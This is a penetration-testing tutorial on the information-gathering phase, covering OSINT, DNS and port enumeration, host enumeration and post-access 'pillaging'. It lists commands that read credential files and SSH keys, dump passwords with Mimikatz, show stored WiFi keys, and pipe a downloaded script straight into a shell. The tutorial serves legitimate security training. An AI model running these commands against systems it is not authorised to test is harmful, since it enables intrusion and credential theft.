# Information Gathering Phase

## What Is Information Gathering?

Think of information gathering like being a detective. Before you can solve a case, you need to know everything about your subject: who they are, where they live, who they talk to, what they own, and what secrets they might be hiding. In penetration testing, information gathering is exactly that—learning everything possible about your target before attempting to break in.

**The Golden Rule:** The more you know about a target, the easier it is to find a way in.

Here's a simple analogy: Imagine trying to break into a house. You could just walk up and start trying random keys, or you could first observe the house, learn when the owners leave, notice the broken window latch, find out where they hide the spare key, and discover that their alarm code is their anniversary date (which you found on Facebook). That's the difference between testing blind and testing with good information.

---

## Why Information Gathering Matters

Information gathering is the **foundation of every successful penetration test**. Skip this phase or rush through it, and you'll miss vulnerabilities that were right in front of you.

**What good information gathering gives you:**
- Attack surface awareness (all the doors and windows you can try)
- Potential usernames and email formats for password attacks
- Technology stack details for targeted exploits
- Organizational structure for social engineering
- Third-party services that might be weaker than the main target
- Credentials accidentally exposed in public places

**Real-world example:** A penetration tester found a company's AWS secret keys in a public GitHub repository. Those keys gave access to their entire cloud infrastructure. The "hack" was just searching GitHub—no technical exploitation required.

---

## Key Concepts to Understand First

Before diving into techniques, let's cover some fundamental concepts.

### Passive vs. Active Reconnaissance

This is the most important distinction in information gathering.

| Type | What It Means | Detection Risk | Example |
|------|---------------|----------------|---------|
| **Passive** | Gathering info WITHOUT touching the target | None | Searching Google, reading their website |
| **Active** | Gathering info BY interacting with the target | Can be detected | Port scanning, sending requests |

**Think of it this way:**
- **Passive** = Looking at someone's house from across the street with binoculars
- **Active** = Walking up to the house and checking if doors are locked

**Why does this matter?** In some engagements (especially red team assessments), you need to avoid detection. Active reconnaissance creates logs, triggers alerts, and might tip off the target. Passive reconnaissance is invisible.

**Best Practice:** Always start with passive reconnaissance. Exhaust all passive options before going active.

### The Information Gathering Cycle

Information gathering isn't a one-time activity. It's a cycle you repeat throughout the entire engagement:

```
    ┌────────────────────────────────────────┐
    │                                        │
    ▼                                        │
┌───────────┐    ┌───────────┐    ┌──────────┴──┐
│  Gather   │───▶│  Analyze  │───▶│  Discover   │
│   Info    │    │  Findings │    │  New Leads  │
└───────────┘    └───────────┘    └─────────────┘
    ▲                                        │
    │                                        │
    └────────────────────────────────────────┘
            (Repeat with new leads)
```

**Example cycle:**
1. You find a subdomain: `dev.company.com`
2. You scan it and find a login page
3. The login page reveals it's running Jenkins
4. You search for Jenkins default credentials and vulnerabilities
5. You find a known CVE and the Jenkins version matches
6. You now have a potential attack vector

Each discovery leads to more questions and more gathering.

---

## The Five Categories of Information Gathering

Information gathering is organized into five categories. Think of these as different "buckets" of information you're trying to fill:

| Category | What You're Looking For | When It Happens |
|----------|------------------------|-----------------|
| **OSINT** | Publicly available information | Before touching the target |
| **Infrastructure Enumeration** | Network layout, servers, cloud services | Early in active phase |
| **Service Enumeration** | What's running on each server | After finding hosts |
| **Host Enumeration** | Deep dive into individual machines | After finding services |
| **Pillaging** | Sensitive data on compromised systems | After gaining access |

Let's explore each one in detail.

---

## Category 1: Open-Source Intelligence (OSINT)

### What Is OSINT?

OSINT is information gathered from publicly available sources—no hacking required. You're essentially being a very thorough internet stalker (legally, with permission).

**OSINT sources include:**
- Company websites and documentation
- Social media (LinkedIn, Twitter, Facebook)
- Job postings (reveal technologies used)
- Code repositories (GitHub, GitLab, Bitbucket)
- Forums and Q&A sites (StackOverflow)
- News articles and press releases
- Public records and filings
- Search engine results
- Archived/cached pages (Wayback Machine)

### What You're Looking For

| Information Type | Why It's Useful | Where to Find It |
|-----------------|-----------------|------------------|
| **Employee names** | Usernames, social engineering | LinkedIn, company website |
| **Email format** | Guess other emails (john.doe@company.com) | Hunter.io, email headers |
| **Technologies used** | Target specific vulnerabilities | Job postings, BuiltWith |
| **Organizational structure** | Identify high-value targets | LinkedIn, annual reports |
| **Leaked credentials** | Direct access | HaveIBeenPwned, breach databases |
| **Exposed code/configs** | Hardcoded secrets, API keys | GitHub, Pastebin |
| **Infrastructure details** | IP ranges, domains, cloud providers | DNS records, Shodan |

### The Crown Jewels: Accidental Exposures

Developers and employees accidentally expose sensitive information all the time. These are your highest-priority OSINT findings:

**What people accidentally leak:**
- Passwords and API keys in code commits
- AWS/Azure/GCP credentials
- SSH private keys
- Database connection strings
- Internal documentation
- VPN configurations
- Test credentials that work in production

> **Important:** If you find exposed credentials or active vulnerabilities during OSINT, follow the Rules of Engagement incident handling procedures. Some findings require immediate client notification.

### OSINT Tools and Techniques

#### Google Dorking

Google is your most powerful OSINT tool. "Dorking" means using advanced search operators to find specific information.

**Essential Google Dorks:**

```
# Find all indexed pages for a domain
site:company.com

# Find specific file types
site:company.com filetype:pdf
site:company.com filetype:xlsx
site:company.com filetype:docx

# Find login pages
site:company.com inurl:login
site:company.com intitle:"login"

# Find exposed directories
site:company.com intitle:"index of"

# Find configuration files
site:company.com filetype:conf OR filetype:config OR filetype:cfg

# Find potential passwords/credentials
site:company.com "password" filetype:txt
site:company.com "api_key" OR "apikey"

# Find error messages that reveal info
site:company.com "error" OR "warning" OR "exception"

# Exclude certain results
site:company.com -www -blog
```

#### theHarvester

Automated tool that collects emails, subdomains, IPs, and URLs from multiple sources.

```bash
# Basic usage - search all sources
theHarvester -d company.com -b all

# Search specific sources
theHarvester -d company.com -b google,linkedin,github

# Limit results
theHarvester -d company.com -b all -l 500
```

**What it finds:**
- Email addresses
- Subdomains
- IP addresses
- Employee names (from LinkedIn)
- Open ports (from Shodan)

#### GitHub Recon

Search for company code, leaked secrets, and employee projects.

```bash
# Search GitHub for company domain
# Look for: company.com, @company.com, company-internal

# Search for secrets (use GitHub search or tools like truffleHog)
truffleHog https://github.com/company/repo

# Search for sensitive files
filename:.env company
filename:id_rsa company
filename:credentials company
```

**What to search for on GitHub:**
- Company name and domain
- Employee names (from LinkedIn)
- Product names
- Internal tool names (found in job postings)
- Error messages (unique strings)

#### Shodan

Search engine for internet-connected devices. Shows what's exposed to the internet.

```bash
# Search by organization
org:"Company Name"

# Search by domain
hostname:company.com

# Search by IP range
net:192.168.1.0/24

# Find specific services
org:"Company Name" port:22
org:"Company Name" product:apache
```

**What Shodan reveals:**
- Open ports and services
- Software versions
- SSL certificate details
- Vulnerabilities (CVEs)
- Banner information

#### Other OSINT Tools

| Tool | Purpose | Usage |
|------|---------|-------|
| **Maltego** | Visual link analysis, relationship mapping | GUI-based investigation |
| **Recon-ng** | Modular reconnaissance framework | `recon-ng` then load modules |
| **SpiderFoot** | Automated OSINT collection | `spiderfoot -s company.com` |
| **Hunter.io** | Find email addresses and format | Web-based, API available |
| **Wayback Machine** | View archived versions of websites | archive.org |
| **FOCA** | Metadata extraction from documents | GUI tool for Windows |

---

## Category 2: Infrastructure Enumeration

### What Is Infrastructure Enumeration?

Now we're starting to touch the target (active reconnaissance). Infrastructure enumeration maps out the target's network presence: what servers exist, how they're connected, and what protects them.

**You're building a map that shows:**
- All domains and subdomains
- IP addresses and ranges
- Cloud services (AWS, Azure, GCP)
- Email servers
- DNS servers
- Security devices (firewalls, WAFs, load balancers)
- CDN usage (Cloudflare, Akamai)

### DNS Enumeration

DNS (Domain Name System) is like the phone book of the internet. It's also a goldmine of information about a target's infrastructure.

#### Basic DNS Lookups

```bash
# Simple lookup - get IP address
nslookup company.com
dig company.com

# Get all record types
dig company.com ANY

# Specific record types
dig company.com MX      # Mail servers
dig company.com NS      # Name servers
dig company.com TXT     # Text records (often contain SPF, DKIM)
dig company.com CNAME   # Aliases
dig company.com A       # IPv4 addresses
dig company.com AAAA    # IPv6 addresses
```

#### DNS Record Types Explained

| Record | What It Contains | Why It's Useful |
|--------|-----------------|-----------------|
| **A** | IPv4 address | Find server IPs |
| **AAAA** | IPv6 address | Find IPv6-enabled servers |
| **MX** | Mail server hostnames | Identify email infrastructure |
| **NS** | Name server hostnames | Identify DNS infrastructure |
| **TXT** | Text data | SPF records reveal allowed email senders |
| **CNAME** | Alias to another domain | Find related domains, CDN usage |
| **SOA** | Start of authority | Find primary DNS server, admin email |
| **PTR** | Reverse DNS (IP to hostname) | Find hostnames from IPs |

#### Zone Transfer (AXFR)

A zone transfer is when a DNS server hands over its entire database. It's meant for backup DNS servers, but misconfigured servers allow anyone to request it.

```bash
# Attempt zone transfer
dig axfr @ns1.company.com company.com

# Using host command
host -t axfr company.com ns1.company.com
```

**If successful, you get:** Every DNS record for the domain—a complete map of their infrastructure.

> **Note:** Zone transfers are rarely successful against properly configured servers, but always try. It takes seconds and the payoff is huge.

#### Subdomain Enumeration

Subdomains often host forgotten, unpatched, or internal-facing applications.

```bash
# Using Sublist3r (passive)
sublist3r -d company.com

# Using Amass (passive + active)
amass enum -passive -d company.com    # Passive only
amass enum -active -d company.com     # Include active techniques

# Using ffuf for brute forcing (active)
ffuf -w /usr/share/wordlists/subdomains.txt -u http://FUZZ.company.com

# Using gobuster
gobuster dns -d company.com -w /usr/share/wordlists/subdomains.txt
```

**High-value subdomains to look for:**
- `dev.`, `staging.`, `test.`, `uat.` - Development environments
- `admin.`, `portal.`, `manage.` - Administrative interfaces
- `api.`, `api-dev.`, `api-staging.` - API endpoints
- `vpn.`, `remote.`, `gateway.` - Remote access
- `mail.`, `webmail.`, `owa.` - Email systems
- `jenkins.`, `gitlab.`, `jira.` - Development tools
- `old.`, `legacy.`, `backup.` - Forgotten systems

### WHOIS Lookups

WHOIS provides domain registration information.

```bash
whois company.com
```

**What you learn:**
- Registrar and registration dates
- Name servers
- Registrant contact info (if not privacy-protected)
- Related domains (same registrant)

### IP and Network Range Discovery

```bash
# Find IP ranges owned by organization
whois -h whois.arin.net "company name"

# BGP/ASN lookup
whois -h whois.radb.net "company name"

# Using online tools
# - bgp.he.net
# - ipinfo.io
```

### Cloud Infrastructure Discovery

Modern companies use cloud services. Identify which ones and look for misconfigurations.

```bash
# Check for AWS S3 buckets
# Common naming: company-backup, company-data, company-assets
aws s3 ls s3://company-backup --no-sign-request

# Azure blob storage
# Check: company.blob.core.windows.net

# Google Cloud Storage
# Check: storage.googleapis.com/company-bucket
```

**Tools for cloud enumeration:**
- `cloud_enum` - Multi-cloud enumeration
- `S3Scanner` - Find open S3 buckets
- `AzureHound` - Azure enumeration
- `ScoutSuite` - Multi-cloud security auditing

---

## Category 3: Service Enumeration

### What Is Service Enumeration?

You've found the servers. Now you need to know what's running on them. Service enumeration identifies the software, versions, and configurations of services on each host.

**Why versions matter:** A web server running Apache 2.4.49 is very different from Apache 2.4.51. The first has a critical path traversal vulnerability (CVE-2021-41773). The second is patched. Version numbers are everything.

### Port Scanning with Nmap

Nmap is the industry-standard port scanner. Master it.

#### Basic Scanning

```bash
# Quick scan - top 1000 ports
nmap 192.168.1.1

# Scan specific ports
nmap -p 22,80,443 192.168.1.1

# Scan port range
nmap -p 1-1000 192.168.1.1

# Scan ALL ports (takes longer)
nmap -p- 192.168.1.1

# Fast scan (top 100 ports)
nmap -F 192.168.1.1
```

#### Service and Version Detection

```bash
# Service version detection
nmap -sV 192.168.1.1

# Aggressive version detection
nmap -sV --version-intensity 5 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Combined: versions + OS + scripts + traceroute
nmap -A 192.168.1.1
```

#### Nmap Scripting Engine (NSE)

Nmap includes scripts for vulnerability detection and enumeration.

```bash
# Run default scripts
nmap -sC 192.168.1.1

# Run specific script category
nmap --script vuln 192.168.1.1
nmap --script auth 192.168.1.1

# Run specific script
nmap --script http-title 192.168.1.1
nmap --script smb-enum-shares 192.168.1.1

# Common combined scan
nmap -sV -sC -p- 192.168.1.1
```

#### Understanding Nmap Output

```
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 8.2p1 Ubuntu
80/tcp   open   http       Apache httpd 2.4.41
443/tcp  open   https      Apache httpd 2.4.41
3306/tcp closed mysql
```

| Column | Meaning |
|--------|---------|
| **PORT** | Port number and protocol |
| **STATE** | open, closed, filtered, or unfiltered |
| **SERVICE** | What Nmap thinks is running |
| **VERSION** | Software name and version |

**Port states explained:**
- **open** - Accepting connections
- **closed** - Reachable but no service listening
- **filtered** - Can't determine (firewall blocking)
- **unfiltered** - Reachable but can't determine if open/closed

### Banner Grabbing

Sometimes you need to manually connect and see what a service says.

```bash
# Using netcat
nc -v 192.168.1.1 22
nc -v 192.168.1.1 80

# Using telnet
telnet 192.168.1.1 25

# HTTP banner
curl -I http://192.168.1.1

# HTTPS certificate info
openssl s_client -connect 192.168.1.1:443
```

### Service-Specific Enumeration

Different services require different enumeration techniques.

#### Web Services (80/443)

```bash
# Technology fingerprinting
whatweb http://192.168.1.1
wappalyzer  # Browser extension

# Directory/file brute forcing
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/common.txt
feroxbuster -u http://192.168.1.1 -w /usr/share/wordlists/common.txt
ffuf -u http://192.168.1.1/FUZZ -w /usr/share/wordlists/common.txt

# Virtual host discovery
ffuf -u http://192.168.1.1 -H "Host: FUZZ.company.com" -w subdomains.txt

# Nikto vulnerability scan
nikto -h http://192.168.1.1
```

#### SMB (445)

```bash
# List shares
smbclient -L //192.168.1.1 -N

# Enum4linux (comprehensive)
enum4linux -a 192.168.1.1

# Nmap scripts
nmap --script smb-enum-shares,smb-enum-users 192.168.1.1

# Check for vulnerabilities
nmap --script smb-vuln* 192.168.1.1
```

#### SSH (22)

```bash
# Banner grab
nc -v 192.168.1.1 22

# Nmap scripts
nmap --script ssh-auth-methods 192.168.1.1
nmap --script ssh2-enum-algos 192.168.1.1
```

#### FTP (21)

```bash
# Check anonymous login
ftp 192.168.1.1
# Username: anonymous
# Password: (blank or any email)

# Nmap scripts
nmap --script ftp-anon,ftp-bounce 192.168.1.1
```

#### SMTP (25)

```bash
# Connect and enumerate
nc -v 192.168.1.1 25
VRFY admin
EXPN admin

# Nmap scripts
nmap --script smtp-enum-users 192.168.1.1
```

#### DNS (53)

```bash
# Zone transfer attempt
dig axfr @192.168.1.1 company.com

# Nmap scripts
nmap --script dns-zone-transfer 192.168.1.1
```

#### SNMP (161)

```bash
# Enumerate with default community strings
snmpwalk -v2c -c public 192.168.1.1
onesixtyone 192.168.1.1

# Nmap scripts
nmap --script snmp-info 192.168.1.1
```

---

## Category 4: Host Enumeration

### What Is Host Enumeration?

Host enumeration is a deep dive into individual machines. After finding services, you examine each host thoroughly to understand its role, configuration, and potential weaknesses.

### Remote Host Enumeration

What you can learn without access to the host:

```bash
# OS detection
nmap -O 192.168.1.1

# Detailed enumeration
nmap -A 192.168.1.1

# HTTP headers reveal server info
curl -I http://192.168.1.1

# SSL certificate details
openssl s_client -connect 192.168.1.1:443 | openssl x509 -text
```

### Local Host Enumeration (Post-Access)

After gaining access to a system, gather information locally.

#### Linux Host Enumeration

```bash
# System information
uname -a                    # Kernel version
cat /etc/os-release         # OS details
hostname                    # Hostname

# Users and groups
cat /etc/passwd             # All users
cat /etc/group              # All groups
who                         # Logged in users
last                        # Login history

# Network configuration
ip a                        # Network interfaces
ip route                    # Routing table
cat /etc/hosts              # Host file
cat /etc/resolv.conf        # DNS configuration
netstat -tuln               # Listening services
ss -tuln                    # Alternative to netstat

# Running processes
ps aux                      # All processes
ps aux | grep root          # Root processes

# Scheduled tasks
cat /etc/crontab            # System cron
ls -la /etc/cron.*          # Cron directories
crontab -l                  # Current user cron

# Installed software
dpkg -l                     # Debian/Ubuntu
rpm -qa                     # RedHat/CentOS

# SUID/SGID binaries (privilege escalation potential)
find / -perm -4000 2>/dev/null    # SUID
find / -perm -2000 2>/dev/null    # SGID

# Writable directories
find / -writable -type d 2>/dev/null
```

**Automated Linux enumeration:**
```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh
```

#### Windows Host Enumeration

```powershell
# System information
systeminfo                      # Detailed system info
hostname                        # Hostname
whoami /all                     # Current user details

# Users and groups
net user                        # Local users
net localgroup                  # Local groups
net localgroup Administrators   # Admin group members

# Network configuration
ipconfig /all                   # Network interfaces
route print                     # Routing table
netstat -ano                    # Listening ports with PIDs
arp -a                          # ARP table

# Running processes
tasklist                        # All processes
tasklist /svc                   # Processes with services

# Services
sc query                        # All services
wmic service list brief         # Service list

# Scheduled tasks
schtasks /query /fo LIST        # Scheduled tasks

# Installed software
wmic product get name,version   # Installed programs

# Environment variables
set                             # All environment variables
```

**Automated Windows enumeration:**
```powershell
# WinPEAS
.\winPEASany.exe

# PowerUp (privilege escalation)
. .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all
```

---

## Category 5: Pillaging

### What Is Pillaging?

Pillaging happens after you've gained access to a system. You're searching for sensitive data: credentials, personal information, business secrets, and anything that demonstrates impact or enables further access.

> **Note:** Pillaging is technically part of post-exploitation, but it's included here because it's information gathering—just at a later stage.

### What to Look For

| Data Type | Examples | Why It Matters |
|-----------|----------|----------------|
| **Credentials** | Passwords, hashes, keys, tokens | Enable further access |
| **Configuration files** | Database configs, app configs | Contain credentials |
| **Personal data** | SSN, credit cards, health records | Demonstrates impact (compliance) |
| **Business data** | Financial reports, contracts | Demonstrates impact |
| **Email** | PST files, mail spools | Contains sensitive communications |
| **Code/Scripts** | Internal tools, automation | May contain hardcoded creds |

### Common Credential Locations

#### Linux

```bash
# History files (may contain typed passwords)
cat ~/.bash_history
cat ~/.zsh_history

# SSH keys
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# Configuration files
cat /var/www/html/config.php
cat /var/www/html/.env
find / -name "*.conf" 2>/dev/null | xargs grep -l password

# Common config locations
cat /etc/mysql/my.cnf
cat /etc/apache2/sites-enabled/*

# Web application databases
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null
```

#### Windows

```powershell
# Saved credentials
cmdkey /list

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# Registry (autologon)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Unattend/Sysprep files
dir C:\unattend.xml /s
dir C:\Windows\Panther\Unattend.xml

# PowerShell history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# IIS configuration
type C:\inetpub\wwwroot\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

### Memory Credential Extraction

#### Mimikatz (Windows)

```powershell
# Dump credentials from memory
sekurlsa::logonpasswords

# Dump cached credentials
lsadump::cache

# Dump SAM database
lsadump::sam

# Export tickets
sekurlsa::tickets /export
```

#### Linux Memory

```bash
# Dump process memory
gcore <pid>

# Search for strings in memory dump
strings core.<pid> | grep -i password
```

### Active Directory Pillaging

```powershell
# BloodHound collection
.\SharpHound.exe -c all

# Find domain admins
net group "Domain Admins" /domain

# Find shares with interesting files
Invoke-ShareFinder -CheckShareAccess

# Search for sensitive files
Invoke-FileFinder
```

---

## Organizing Your Findings

Information gathering produces a lot of data. Stay organized or you'll drown in notes.

### Recommended Folder Structure

```
engagement_name/
├── 1_osint/
│   ├── emails.txt
│   ├── employees.txt
│   ├── subdomains.txt
│   └── github_findings.md
├── 2_infrastructure/
│   ├── dns_records.txt
│   ├── ip_ranges.txt
│   └── cloud_assets.md
├── 3_services/
│   ├── nmap/
│   │   ├── full_scan.nmap
│   │   └── full_scan.xml
│   └── service_notes.md
├── 4_hosts/
│   ├── 192.168.1.10/
│   │   ├── enumeration.md
│   │   └── screenshots/
│   └── 192.168.1.20/
├── 5_credentials/
│   └── found_creds.txt (encrypted!)
└── notes.md
```

### Documentation Tips

1. **Timestamp everything** - Know when you found what
2. **Record commands** - You'll need to reproduce findings
3. **Screenshot evidence** - Proves what you found
4. **Note the source** - Where did each piece of info come from?
5. **Track what's tested** - Avoid duplicating work

### Note-Taking Tools

| Tool | Best For | Notes |
|------|----------|-------|
| **CherryTree** | Hierarchical notes | Offline, portable |
| **Obsidian** | Linked notes, markdown | Great for relationships |
| **Notion** | Collaborative notes | Cloud-based |
| **OneNote** | Screenshots, drawings | Microsoft ecosystem |
| **Plain text/Markdown** | Simplicity, version control | Works everywhere |

---

## Common Mistakes to Avoid

| Mistake | Why It's a Problem | What to Do Instead |
|---------|-------------------|-------------------|
| Skipping OSINT | Miss easy wins, waste time on hard paths | Always exhaust OSINT first |
| Going too fast | Miss findings, create noise | Be thorough and methodical |
| Not documenting | Forget what you found, can't reproduce | Document EVERYTHING |
| Ignoring small findings | Small clues lead to big wins | Record every detail |
| Stopping too early | Miss attack vectors | Enumerate until out of options |
| Tunnel vision | Focus on one thing, miss others | Step back and review periodically |
| No organization | Lose track of findings | Use consistent folder structure |
| Forgetting scope | Legal and ethical issues | Constantly verify scope |

---

## When to Move On

Information gathering could go on forever. Here's how to know when you've done enough:

**You're ready to move on when:**
- You've enumerated all in-scope assets
- You've identified the technology stack
- You have a list of potential attack vectors
- You've documented usernames/email formats
- You've checked for exposed credentials
- You've enumerated all discovered services
- Additional searches return diminishing results

**Remember:** You'll return to information gathering throughout the engagement. Don't try to find everything upfront—find enough to start, then gather more as you go.

---

## Quick Reference: Tool Cheatsheet

### OSINT

| Tool | Command | Purpose |
|------|---------|---------|
| theHarvester | `theHarvester -d domain.com -b all` | Collect emails, subdomains |
| Shodan | `shodan search org:"Company"` | Find exposed services |
| Google | `site:domain.com filetype:pdf` | Search indexed content |
| Recon-ng | `recon-ng` | Modular OSINT framework |

### DNS

| Tool | Command | Purpose |
|------|---------|---------|
| dig | `dig domain.com ANY` | DNS records |
| dig | `dig axfr @ns.domain.com domain.com` | Zone transfer |
| Amass | `amass enum -d domain.com` | Subdomain enum |

### Port/Service Scanning

| Tool | Command | Purpose |
|------|---------|---------|
| Nmap | `nmap -sV -sC -p- target` | Full scan with scripts |
| Nmap | `nmap -O target` | OS detection |
| Netcat | `nc -v target port` | Banner grab |

### Web

| Tool | Command | Purpose |
|------|---------|---------|
| Gobuster | `gobuster dir -u URL -w wordlist` | Directory brute force |
| ffuf | `ffuf -u URL/FUZZ -w wordlist` | Fuzzing |
| Nikto | `nikto -h URL` | Vulnerability scan |
| WhatWeb | `whatweb URL` | Technology fingerprint |

### SMB

| Tool | Command | Purpose |
|------|---------|---------|
| smbclient | `smbclient -L //target -N` | List shares |
| enum4linux | `enum4linux -a target` | Full SMB enum |

---

## Summary

Information gathering is the detective work of penetration testing. The more thorough you are here, the more successful you'll be later. Remember:

1. **Start passive, then go active** - Exhaust OSINT before touching the target
2. **Be organized** - Document everything in a consistent structure
3. **Be thorough** - Check every service, every subdomain, every lead
4. **Be iterative** - Return to gather more info as you discover new leads
5. **Stay in scope** - Constantly verify you're testing authorized targets

The best penetration testers aren't the ones with the fanciest exploits—they're the ones who find the unlocked door while everyone else is trying to pick the lock.
